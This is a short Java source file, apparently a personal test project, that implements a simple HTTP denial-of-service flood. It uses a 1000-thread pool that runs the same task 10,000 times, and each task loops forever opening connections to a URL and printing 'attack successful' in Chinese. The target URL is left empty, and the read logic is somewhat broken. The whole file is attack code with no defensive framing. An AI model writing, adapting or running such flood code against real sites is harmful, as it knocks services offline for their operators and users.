package ddos;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @Description TOO
 * @Author 赵赫智
 * @Date 2019/8/14 16:42
 **/
public class DosTest {
    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(1000);
        MyThread myThread = new MyThread();
        Thread thread = new Thread(myThread);
        for(int i = 0;i<10000;i++){
            executorService.execute(thread);
        }

    }
}
class MyThread implements Runnable{

    @Override
    public void run() {
        while(true){
            try {
                URL url = new URL("");
                URLConnection conn = url.openConnection();
                System.out.print("发包成功");
                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer stringBuffer = new StringBuffer();
                if(bis != null){
                    if((len = bis.read())!=-1){
                        stringBuffer.append(new String(bytes,0,len));
                        System.out.println("攻击成功");
                        bis.close();
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
